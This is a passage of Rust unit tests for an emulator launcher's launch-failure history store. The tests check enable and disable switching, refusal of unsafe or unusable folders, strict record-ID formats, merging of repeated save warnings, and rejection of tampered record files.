    let report = failed_report();
    assert!(store.is_enabled());
    let kept = saved_id(store.record_launch(&launch("Tetris", 7), &report, at(NOW)));

    store.set_enabled(false).unwrap();
    store.set_enabled(false).unwrap();
    assert!(!store.is_enabled());
    assert_eq!(
        store.record_launch(&launch("Tetris", 7), &report, at(NOW + 1)),
        SaveOutcome::NotSaved(NotSaved::Disabled)
    );
    // Switching off keeps what was stored, until it is cleared.
    assert_eq!(store.list(at(NOW + 2)).records[0].id, kept);
    assert_eq!(store.clear().unwrap(), 1);
    assert!(!store.is_enabled());
    assert_eq!(files(&store), [DISABLED_MARKER]);

    store.set_enabled(true).unwrap();
    store.set_enabled(true).unwrap();
    assert!(store.is_enabled());
    saved_id(store.record_launch(&launch("Tetris", 7), &report, at(NOW + 3)));

    // Switched off before anything was ever stored.
    let fresh = tempfile::tempdir().unwrap();
    let fresh = HistoryStore::at(fresh.path().join(HISTORY_DIRECTORY));
    fresh.set_enabled(false).unwrap();
    assert_eq!(
        fresh.record_launch(&launch("Tetris", 7), &report, at(NOW)),
        SaveOutcome::NotSaved(NotSaved::Disabled)
    );
    assert_eq!(files(&fresh), [DISABLED_MARKER]);
}

#[test]
fn a_store_that_cannot_be_used_refuses_quietly_and_changes_nothing() {
    let dir = tempfile::tempdir().unwrap();
    let report = failed_report();
    let refused = |store: &HistoryStore| {
        let outcome = store.record_launch(&launch("Tetris", 7), &report, at(NOW));
        // Unusable is said as unusable, never as "switched off".
        assert!(
            matches!(
                outcome,
                SaveOutcome::NotSaved(NotSaved::StorageUnavailable { .. })
            ),
            "{outcome:?}"
        );
        // Reading and housekeeping are just as quiet.
        assert_eq!(store.list(at(NOW)), HistoryListing::default());
        assert_eq!(store.enforce_limits(at(NOW)), 0);
        assert_eq!(store.latest_for_game(7, at(NOW)), None);
    };

    // A folder other users can reach.
    let open = dir.path().join("open");
    std::fs::create_dir(&open).unwrap();
    std::fs::set_permissions(&open, std::fs::Permissions::from_mode(0o755)).unwrap();
    refused(&HistoryStore::at(&open));
    assert_eq!(std::fs::read_dir(&open).unwrap().count(), 0);

    // A plain file where the folder should be.
    let file = dir.path().join("file");
    std::fs::write(&file, "not a folder").unwrap();
    refused(&HistoryStore::at(&file));
    assert_eq!(std::fs::read_to_string(&file).unwrap(), "not a folder");

    // A link to a private folder somewhere else.
    let target = dir.path().join("target");
    std::fs::create_dir(&target).unwrap();
    std::fs::set_permissions(&target, std::fs::Permissions::from_mode(0o700)).unwrap();
    let link = dir.path().join("link");
    symlink(&target, &link).unwrap();
    refused(&HistoryStore::at(&link));
    assert_eq!(std::fs::read_dir(&target).unwrap().count(), 0);

    // A data directory that does not exist is not created.
    let missing = dir.path().join("no-data-dir").join(HISTORY_DIRECTORY);
    refused(&HistoryStore::at(&missing));
    assert!(!dir.path().join("no-data-dir").exists());

    // A folder that cannot be written to.
    let read_only = dir.path().join("read-only");
    std::fs::create_dir(&read_only).unwrap();
    std::fs::set_permissions(&read_only, std::fs::Permissions::from_mode(0o500)).unwrap();
    // SAFETY: geteuid has no preconditions and cannot fail.
    if unsafe { libc::geteuid() } != 0 {
        refused(&HistoryStore::at(&read_only));
    }
    std::fs::set_permissions(&read_only, std::fs::Permissions::from_mode(0o700)).unwrap();
    assert_eq!(std::fs::read_dir(&read_only).unwrap().count(), 0);
}

#[test]
fn several_runs_mixed_together_leave_the_exit_out() {
    let mut set = failed_set();
    process::record_exit(&mut set, ExitOutcome::Exited { code: 0 }, None, None);
    let report = diagnose(&set);
    let record = FailureRecord::summarise(
        "20270115T080000Z-00000000".into(),
        NOW,
        &launch("Tetris", 7),
        &report,
        &saves::assess(&report.evidence),
    );
    assert_eq!(record.exit, None);
    assert!(record.is_well_formed());
    assert!(
        record
            .describe()
            .join("\n")
            .contains("How the emulator ended was not recorded.")
    );
}

#[test]
fn record_ids_are_strict_and_timestamps_are_correct() {
    assert_eq!(timestamp(0), "19700101T000000Z");
    assert_eq!(timestamp(951_782_400), "20000229T000000Z");
    assert_eq!(timestamp(1_709_251_199), "20240229T235959Z");
    assert_eq!(timestamp(NOW), "20270115T080000Z");
    assert_eq!(readable_time(NOW), "2027-01-15 08:00 UTC");
    assert!(is_record_id("20270115T080000Z-0123abcd"));
    for bad in [
        "20270115T080000Z-0123ABCD",
        "20270115T080000Z-0123abc",
        "20270115T080000Z-0123abcde",
        "20270115t080000Z-0123abcd",
        "2027011ST080000Z-0123abcd",
        "20270115T080000Z_0123abcd",
        "../0115T080000Z-0123abcd",
        "",
    ] {
        assert!(!is_record_id(bad), "{bad}");
    }
    let suffix = random_suffix();
    assert_eq!(suffix.len(), 8);
    assert!(
        suffix
            .bytes()
            .all(|byte| byte.is_ascii_hexdigit() && !byte.is_ascii_uppercase())
    );
}

#[test]
fn a_game_that_ran_and_could_not_save_is_kept_as_a_warning_not_as_a_failed_launch() {
    let dir = tempfile::tempdir().unwrap();
    let store = store(&dir);
    // Real output: the game ran, RetroArch exited with status 0, and the
    // save could not be written.
    let report = launch_report("retroarch", 0, Some(fixtures::RA_SAVE_DIR_READ_ONLY));
    assert_eq!(report.launch, LaunchOutcome::NoFailureObserved);
    assert!(!is_failed_launch(&report));
    let id = saved_id(store.record_launch(&launch("Tetris", 7), &report, at(NOW)));
    let record = store.load(&id, at(NOW + DAY)).unwrap();
    assert_eq!(record.launch, LaunchOutcome::NoFailureObserved);
    assert_eq!(
        record.saves.status,
        SaveWriteStatus::WriteFailed(SaveWriteProblem {
            standing: SaveWriteStanding::ReportedByEmulator,
            mechanism: SaveMechanism::BatterySave,
            times: 1,
            folder: SaveFolderFinding::NotKnown,
            recovery_copy_reported: true,
        })
    );
    // Structured values only: no path, no line of output.
    let stored = raw(&store, &id);
    for absent in [
        "/scratch",
        ".srm",
        "Failed to save",
        "[ERROR]",
        "RetroArch-recovery-0",
    ] {
        assert!(!stored.contains(absent), "{absent:?} in {stored}");
    }
    let shown = record.describe().join("\n");
    assert!(
        shown.contains("Launch: no failure of the launch was observed"),
        "{shown}"
    );
    assert!(
        shown.contains("Saves: Your progress may not have been saved."),
        "{shown}"
    );
    assert!(
        shown.contains("RetroArch reported that it could not write this game's save."),
        "{shown}"
    );
    assert!(
        shown.contains("What to check: Check that the save folder exists"),
        "{shown}"
    );
    assert!(shown.contains("EmuWiz has not changed anything"), "{shown}");
    // Available to Game Doctor after a restart: a new store over the same
    // folder finds it for the game.
    let reopened = HistoryStore::at(store.directory());
    assert_eq!(reopened.latest_for_game(7, at(NOW + 60)), Some(record));
}

#[test]
fn the_same_save_warning_for_the_same_game_is_one_record_that_counts() {
    let dir = tempfile::tempdir().unwrap();
    let store = store(&dir);
    let warning = launch_report("retroarch", 0, Some(fixtures::RA_SAVE_DIR_READ_ONLY));
    let mut last = String::new();
    for index in 0..5u64 {
        last = saved_id(store.record_launch(&launch("Tetris", 7), &warning, at(NOW + index * 60)));
        assert_eq!(files(&store).len(), 1, "after launch {index}");
    }
    let record = store.load(&last, at(NOW + DAY)).unwrap();
    assert_eq!(record.occurrences, 5);
    assert_eq!(record.first_recorded_at_unix, NOW);
    assert_eq!(record.recorded_at_unix, NOW + 4 * 60);
    let shown = record.describe().join("\n");
    assert!(
        shown.contains(
            "This happened 5 times since 2027-01-15 08:00 UTC; launches where it did not happen are \
             not counted."
        ),
        "{shown}"
    );

    // Another game, and a game with no library id, are their own records.
    saved_id(store.record_launch(&launch("Zelda", 8), &warning, at(NOW + 600)));
    let unlisted = LaunchIdentity {
        library_id: None,
        ..launch("Loose file", 0)
    };
    saved_id(store.record_launch(&unlisted, &warning, at(NOW + 601)));
    saved_id(store.record_launch(&unlisted, &warning, at(NOW + 602)));
    assert_eq!(files(&store).len(), 4);

    // A failed launch for the same game is not a repeat of the warning,
    // and failed launches are never merged with each other.
    saved_id(store.record_launch(&launch("Tetris", 7), &failed_report(), at(NOW + 700)));
    saved_id(store.record_launch(&launch("Tetris", 7), &failed_report(), at(NOW + 701)));
    assert_eq!(files(&store).len(), 6);
    // The warning comes back after the failures: it continues its count.
    let again = saved_id(store.record_launch(&launch("Tetris", 7), &warning, at(NOW + 800)));
    assert_eq!(store.load(&again, at(NOW + DAY)).unwrap().occurrences, 6);
    assert_eq!(files(&store).len(), 6);

    // A warning older than the age limit is not continued.
    let later = NOW + 800 + 15 * DAY;
    let fresh = saved_id(store.record_launch(&launch("Tetris", 7), &warning, at(later)));
    let record = store.load(&fresh, at(later)).unwrap();
    assert_eq!(record.occurrences, 1);
    assert_eq!(record.first_recorded_at_unix, later);
}

#[test]
fn a_planted_count_or_save_status_is_not_shown() {
    let dir = tempfile::tempdir().unwrap();
    let store = store(&dir);
    let warning = launch_report("retroarch", 0, Some(fixtures::RA_SAVE_DIR_READ_ONLY));
    let good = saved_id(store.record_launch(&launch("Tetris", 7), &warning, at(NOW)));
    let template: serde_json::Value = serde_json::from_str(&raw(&store, &good)).unwrap();
    let plant = |suffix: &str, edit: &dyn Fn(&mut serde_json::Value)| -> String {
        let id = format!("20270115T080000Z-{suffix}");
        let mut value = template.clone();
        value["id"] = serde_json::Value::String(id.clone());
        edit(&mut value);
        std::fs::write(
            store.directory().join(format!("{id}.json")),
            serde_json::to_vec(&value).unwrap(),
        )
        .unwrap();
        id
    };
    let planted = [
        plant("000000a1", &|value| {
            value["occurrences"] = serde_json::json!(0)
        }),
        plant("000000a2", &|value| {
            value["first_recorded_at_unix"] = serde_json::json!(NOW + 1);
        }),
        plant("000000a3", &|value| {
            value["saves"]["status"]["detail"]["note"] = serde_json::json!("run this");
        }),
        plant("000000a4", &|value| {
            value["saves"]["status"] = serde_json::json!({"status": "all_saved"});
        }),
        plant("000000a5", &|value| {
            value["saves"]["monitored"] = serde_json::json!(["cloud_saves"]);
        }),
        plant("000000a6", &|value| {
            value["launch"] = serde_json::json!("game_loaded")
        }),
        plant("000000a7", &|value| {
            value["saves"]["monitored"] = serde_json::json!([
                "battery_save",
                "save_state",
                "emulator_owned_files",
                "battery_save"
            ]);
        }),
    ];
    for id in &planted {
        assert!(
            matches!(
                store.load(id, at(NOW + DAY)),
                Err(HistoryError::Unreadable(_))
            ),
            "{id} was readable"
        );
    }
    assert_eq!(store.list(at(NOW + 1)).records.len(), 1);
    assert_eq!(files(&store), [format!("{good}.json")]);
}

#[test]
fn looking_without_tidying_shows_the_same_records_and_removes_nothing() {
    let dir = tempfile::tempdir().unwrap();
    let store = store(&dir);
    let report = failed_report();
    let old = saved_id(store.record_launch(&launch("Old", 1), &report, at(NOW)));
    let recent = saved_id(store.record_launch(&launch("Recent", 2), &report, at(NOW + 10 * DAY)));
    std::fs::write(
        store.directory().join("20270115T080000Z-00000bad.json"),
        b"{",
    )
    .unwrap();
    std::fs::write(store.directory().join(".writing-1-00000000"), b"x").unwrap();
    let before = files(&store);

    // Past the age limit for the first record.
    let later = at(NOW + 14 * DAY + 1);
    let view = store.view(later);
    assert_eq!(view.unreadable, 1);
    assert_eq!(view.records.len(), 1);
    assert_eq!(view.records[0].id, recent);
    assert_eq!(files(&store), before);
    // One record asked for by its id is treated the same way: still on
    // disk, and not shown once it is past the age limit.
    assert!(store.load(&old, at(NOW + 14 * DAY)).is_ok());
    assert!(matches!(
        store.load(&old, later),
        Err(HistoryError::NotFound)
    ));
    assert_eq!(files(&store), before);

    // Tidying shows the same records, and then the rest is gone (the
    // leftover too: by this clock it is long abandoned).
    let listing = store.list(later);
    assert_eq!(listing.records, view.records);
    assert_eq!(files(&store), [format!("{recent}.json")]);

    // The count limit applies to the view as it does to the store.
    let small = store.clone().with_limits(HistoryLimits {
        max_records: 1,
        ..HistoryLimits::default()
    });
    saved_id(store.record_launch(&launch("Third", 3), &report, at(NOW + 11 * DAY)));
    assert_eq!(files(&store).len(), 2);
    let view = small.view(at(NOW + 11 * DAY));
    assert_eq!(view.records.len(), 1);
    assert_eq!(view.records[0].game.library_id, Some(3));
    assert_eq!(files(&store).len(), 2);

    // A store that does not exist is an empty view, and stays absent.
    let none = tempfile::tempdir().unwrap();
    let absent = HistoryStore::at(none.path().join(HISTORY_DIRECTORY));
    assert_eq!(absent.view(at(NOW)), HistoryListing::default());
    assert!(!absent.directory().exists());
}
